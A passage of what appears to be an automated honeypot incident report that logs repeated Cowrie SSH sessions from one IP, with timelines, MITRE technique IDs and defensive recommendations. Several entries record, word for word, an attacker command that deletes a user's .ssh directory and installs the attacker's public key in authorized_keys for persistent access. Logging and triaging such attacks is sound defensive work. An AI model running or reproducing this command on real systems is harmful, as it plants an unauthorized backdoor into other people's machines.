| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 12:08:07` | `cowrie.session.connect` |
| `2026-05-21 12:08:07` | `cowrie.client.version` |
| `2026-05-21 12:08:08` | `cowrie.client.kex` |
| `2026-05-21 12:08:08` | `cowrie.login.success` |
| `2026-05-21 12:08:08` | `cowrie.session.params` |
| `2026-05-21 12:08:08` | `cowrie.command.input` |
| `2026-05-21 12:08:08` | `cowrie.command.failed` |
| `2026-05-21 12:08:08` | `cowrie.log.closed` |
| `2026-05-21 12:08:09` | `cowrie.session.params` |
| `2026-05-21 12:08:09` | `cowrie.command.input` |
| `2026-05-21 12:08:09` | `cowrie.session.file_download` |
| `2026-05-21 12:08:09` | `cowrie.log.closed` |
| `2026-05-21 12:08:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.117[.]234` to AbuseIPDB if not already reported
- [ ] Block `101.36.117[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d63332c445d

| Field | Detail |
|---|---|
| **Source IP** | `101.36.117[.]234` |
| **First Seen** | 2026-05-21 12:08 |
| **Last Seen** | 2026-05-21 12:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 12:08:10` | `cowrie.session.connect` |
| `2026-05-21 12:08:10` | `cowrie.client.version` |
| `2026-05-21 12:08:11` | `cowrie.client.kex` |
| `2026-05-21 12:08:11` | `cowrie.login.success` |
| `2026-05-21 12:08:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.117[.]234` to AbuseIPDB if not already reported
- [ ] Block `101.36.117[.]234` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4a3bc3a5893

| Field | Detail |
|---|---|
| **Source IP** | `101.36.117[.]234` |
| **First Seen** | 2026-05-21 12:09 |
| **Last Seen** | 2026-05-21 12:09 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 12:09:20` | `cowrie.session.connect` |
| `2026-05-21 12:09:20` | `cowrie.client.version` |
| `2026-05-21 12:09:20` | `cowrie.client.kex` |
| `2026-05-21 12:09:20` | `cowrie.login.success` |
| `2026-05-21 12:09:20` | `cowrie.session.params` |
| `2026-05-21 12:09:20` | `cowrie.command.input` |
| `2026-05-21 12:09:20` | `cowrie.command.failed` |
| `2026-05-21 12:09:20` | `cowrie.log.closed` |
| `2026-05-21 12:09:21` | `cowrie.session.params` |
| `2026-05-21 12:09:21` | `cowrie.command.input` |
| `2026-05-21 12:09:21` | `cowrie.session.file_download` |
| `2026-05-21 12:09:21` | `cowrie.log.closed` |
| `2026-05-21 12:09:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.117[.]234` to AbuseIPDB if not already reported
- [ ] Block `101.36.117[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94b19e49e755

| Field | Detail |
|---|---|
| **Source IP** | `101.36.117[.]234` |
| **First Seen** | 2026-05-21 12:09 |
| **Last Seen** | 2026-05-21 12:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 12:09:23` | `cowrie.session.connect` |
| `2026-05-21 12:09:23` | `cowrie.client.version` |
| `2026-05-21 12:09:23` | `cowrie.client.kex` |
| `2026-05-21 12:09:23` | `cowrie.login.success` |
| `2026-05-21 12:09:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.117[.]234` to AbuseIPDB if not already reported
- [ ] Block `101.36.117[.]234` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-613536f8671d

| Field | Detail |
|---|---|
| **Source IP** | `101.36.117[.]234` |
| **First Seen** | 2026-05-21 12:10 |
| **Last Seen** | 2026-05-21 12:10 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 12:10:33` | `cowrie.session.connect` |
| `2026-05-21 12:10:33` | `cowrie.client.version` |
| `2026-05-21 12:10:33` | `cowrie.client.kex` |
| `2026-05-21 12:10:34` | `cowrie.login.success` |
| `2026-05-21 12:10:34` | `cowrie.session.params` |
| `2026-05-21 12:10:34` | `cowrie.command.input` |
| `2026-05-21 12:10:34` | `cowrie.command.failed` |
| `2026-05-21 12:10:34` | `cowrie.log.closed` |
| `2026-05-21 12:10:34` | `cowrie.session.params` |
| `2026-05-21 12:10:34` | `cowrie.command.input` |
| `2026-05-21 12:10:34` | `cowrie.session.file_download` |
| `2026-05-21 12:10:34` | `cowrie.log.closed` |
| `2026-05-21 12:10:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.117[.]234` to AbuseIPDB if not already reported
- [ ] Block `101.36.117[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4e8cc007392

| Field | Detail |
|---|---|
| **Source IP** | `101.36.117[.]234` |
| **First Seen** | 2026-05-21 12:10 |
| **Last Seen** | 2026-05-21 12:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 12:10:36` | `cowrie.session.connect` |
| `2026-05-21 12:10:36` | `cowrie.client.version` |
| `2026-05-21 12:10:36` | `cowrie.client.kex` |
| `2026-05-21 12:10:37` | `cowrie.login.success` |
| `2026-05-21 12:10:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.117[.]234` to AbuseIPDB if not already reported
- [ ] Block `101.36.117[.]234` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21b71d9b38bd

| Field | Detail |
|---|---|
| **Source IP** | `101.36.117[.]234` |
| **First Seen** | 2026-05-21 12:11 |
| **Last Seen** | 2026-05-21 12:11 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 12:11:48` | `cowrie.session.connect` |
| `2026-05-21 12:11:48` | `cowrie.client.version` |
| `2026-05-21 12:11:48` | `cowrie.client.kex` |
| `2026-05-21 12:11:49` | `cowrie.login.success` |
| `2026-05-21 12:11:49` | `cowrie.session.params` |
| `2026-05-21 12:11:49` | `cowrie.command.input` |
| `2026-05-21 12:11:49` | `cowrie.command.failed` |
| `2026-05-21 12:11:49` | `cowrie.log.closed` |
| `2026-05-21 12:11:49` | `cowrie.session.params` |
| `2026-05-21 12:11:49` | `cowrie.command.input` |
| `2026-05-21 12:11:49` | `cowrie.session.file_download` |
| `2026-05-21 12:11:49` | `cowrie.log.closed` |
| `2026-05-21 12:11:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.117[.]234` to AbuseIPDB if not already reported
- [ ] Block `101.36.117[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b607b3506744

| Field | Detail |
|---|---|
| **Source IP** | `101.36.117[.]234` |
| **First Seen** | 2026-05-21 12:11 |
| **Last Seen** | 2026-05-21 12:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 12:11:51` | `cowrie.session.connect` |
| `2026-05-21 12:11:51` | `cowrie.client.version` |
| `2026-05-21 12:11:51` | `cowrie.client.kex` |
| `2026-05-21 12:11:52` | `cowrie.login.success` |
| `2026-05-21 12:11:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.117[.]234` to AbuseIPDB if not already reported
- [ ] Block `101.36.117[.]234` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44dcc20900ed

| Field | Detail |
|---|---|
| **Source IP** | `101.36.117[.]234` |
| **First Seen** | 2026-05-21 12:13 |
| **Last Seen** | 2026-05-21 12:13 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 12:13:05` | `cowrie.session.connect` |
| `2026-05-21 12:13:05` | `cowrie.client.version` |
| `2026-05-21 12:13:05` | `cowrie.client.kex` |
| `2026-05-21 12:13:05` | `cowrie.login.success` |
| `2026-05-21 12:13:05` | `cowrie.session.params` |
| `2026-05-21 12:13:05` | `cowrie.command.input` |
| `2026-05-21 12:13:05` | `cowrie.command.failed` |
| `2026-05-21 12:13:06` | `cowrie.log.closed` |
| `2026-05-21 12:13:06` | `cowrie.session.params` |
| `2026-05-21 12:13:06` | `cowrie.command.input` |
| `2026-05-21 12:13:06` | `cowrie.session.file_download` |
| `2026-05-21 12:13:06` | `cowrie.log.closed` |
| `2026-05-21 12:13:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.117[.]234` to AbuseIPDB if not already reported
- [ ] Block `101.36.117[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7fe6ea501407

| Field | Detail |
|---|---|
| **Source IP** | `101.36.117[.]234` |
| **First Seen** | 2026-05-21 12:13 |
| **Last Seen** | 2026-05-21 12:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 12:13:08` | `cowrie.session.connect` |
| `2026-05-21 12:13:08` | `cowrie.client.version` |
| `2026-05-21 12:13:08` | `cowrie.client.kex` |
| `2026-05-21 12:13:08` | `cowrie.login.success` |
| `2026-05-21 12:13:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.117[.]234` to AbuseIPDB if not already reported
- [ ] Block `101.36.117[.]234` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6cb507848324

| Field | Detail |
|---|---|
| **Source IP** | `101.36.117[.]234` |
| **First Seen** | 2026-05-21 12:16 |
| **Last Seen** | 2026-05-21 12:16 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 12:16:45` | `cowrie.session.connect` |
| `2026-05-21 12:16:45` | `cowrie.client.version` |
| `2026-05-21 12:16:45` | `cowrie.client.kex` |
| `2026-05-21 12:16:45` | `cowrie.login.success` |
| `2026-05-21 12:16:46` | `cowrie.session.params` |
| `2026-05-21 12:16:46` | `cowrie.command.input` |
| `2026-05-21 12:16:46` | `cowrie.command.failed` |
| `2026-05-21 12:16:46` | `cowrie.log.closed` |
| `2026-05-21 12:16:46` | `cowrie.session.params` |
| `2026-05-21 12:16:46` | `cowrie.command.input` |
| `2026-05-21 12:16:46` | `cowrie.session.file_download` |
| `2026-05-21 12:16:46` | `cowrie.log.closed` |
| `2026-05-21 12:16:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.117[.]234` to AbuseIPDB if not already reported
- [ ] Block `101.36.117[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-801c4cd56895

| Field | Detail |
|---|---|
| **Source IP** | `101.36.117[.]234` |
| **First Seen** | 2026-05-21 12:16 |
| **Last Seen** | 2026-05-21 12:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 12:16:48` | `cowrie.session.connect` |
| `2026-05-21 12:16:48` | `cowrie.client.version` |
| `2026-05-21 12:16:48` | `cowrie.client.kex` |
| `2026-05-21 12:16:48` | `cowrie.login.success` |
| `2026-05-21 12:16:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.117[.]234` to AbuseIPDB if not already reported
- [ ] Block `101.36.117[.]234` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8d0266c345b

| Field | Detail |
|---|---|
| **Source IP** | `101.36.117[.]234` |
| **First Seen** | 2026-05-21 12:19 |
| **Last Seen** | 2026-05-21 12:19 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 12:19:26` | `cowrie.session.connect` |
| `2026-05-21 12:19:26` | `cowrie.client.version` |
| `2026-05-21 12:19:26` | `cowrie.client.kex` |
| `2026-05-21 12:19:27` | `cowrie.login.success` |
| `2026-05-21 12:19:27` | `cowrie.session.params` |
| `2026-05-21 12:19:27` | `cowrie.command.input` |
| `2026-05-21 12:19:27` | `cowrie.command.failed` |
| `2026-05-21 12:19:27` | `cowrie.log.closed` |
| `2026-05-21 12:19:27` | `cowrie.session.params` |
| `2026-05-21 12:19:27` | `cowrie.command.input` |
| `2026-05-21 12:19:27` | `cowrie.session.file_download` |
| `2026-05-21 12:19:27` | `cowrie.log.closed` |
| `2026-05-21 12:19:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.117[.]234` to AbuseIPDB if not already reported
- [ ] Block `101.36.117[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7921915d3bd7

| Field | Detail |
|---|---|
| **Source IP** | `101.36.117[.]234` |
| **First Seen** | 2026-05-21 12:19 |
| **Last Seen** | 2026-05-21 12:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 12:19:29` | `cowrie.session.connect` |
| `2026-05-21 12:19:29` | `cowrie.client.version` |
| `2026-05-21 12:19:29` | `cowrie.client.kex` |
| `2026-05-21 12:19:30` | `cowrie.login.success` |
| `2026-05-21 12:19:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.117[.]234` to AbuseIPDB if not already reported
- [ ] Block `101.36.117[.]234` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6424b9956227

| Field | Detail |
|---|---|
| **Source IP** | `101.36.117[.]234` |
| **First Seen** | 2026-05-21 12:22 |
| **Last Seen** | 2026-05-21 12:22 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 12:22:01` | `cowrie.session.connect` |
| `2026-05-21 12:22:01` | `cowrie.client.version` |
| `2026-05-21 12:22:01` | `cowrie.client.kex` |
| `2026-05-21 12:22:02` | `cowrie.login.success` |
| `2026-05-21 12:22:02` | `cowrie.session.params` |
| `2026-05-21 12:22:02` | `cowrie.command.input` |
| `2026-05-21 12:22:02` | `cowrie.command.failed` |
| `2026-05-21 12:22:02` | `cowrie.log.closed` |
| `2026-05-21 12:22:02` | `cowrie.session.params` |
| `2026-05-21 12:22:02` | `cowrie.command.input` |
| `2026-05-21 12:22:02` | `cowrie.session.file_download` |
| `2026-05-21 12:22:02` | `cowrie.log.closed` |
| `2026-05-21 12:22:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.117[.]234` to AbuseIPDB if not already reported
- [ ] Block `101.36.117[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cdda30f07bbc

| Field | Detail |
|---|---|
| **Source IP** | `101.36.117[.]234` |
| **First Seen** | 2026-05-21 12:22 |
| **Last Seen** | 2026-05-21 12:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 12:22:04` | `cowrie.session.connect` |
| `2026-05-21 12:22:04` | `cowrie.client.version` |
| `2026-05-21 12:22:04` | `cowrie.client.kex` |
| `2026-05-21 12:22:05` | `cowrie.login.success` |
| `2026-05-21 12:22:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.117[.]234` to AbuseIPDB if not already reported
- [ ] Block `101.36.117[.]234` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ed93380410e

| Field | Detail |
|---|---|
| **Source IP** | `101.36.117[.]234` |
| **First Seen** | 2026-05-21 12:23 |
| **Last Seen** | 2026-05-21 12:23 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 12:23:15` | `cowrie.session.connect` |
| `2026-05-21 12:23:15` | `cowrie.client.version` |
| `2026-05-21 12:23:15` | `cowrie.client.kex` |
| `2026-05-21 12:23:16` | `cowrie.login.success` |
| `2026-05-21 12:23:16` | `cowrie.session.params` |
| `2026-05-21 12:23:16` | `cowrie.command.input` |
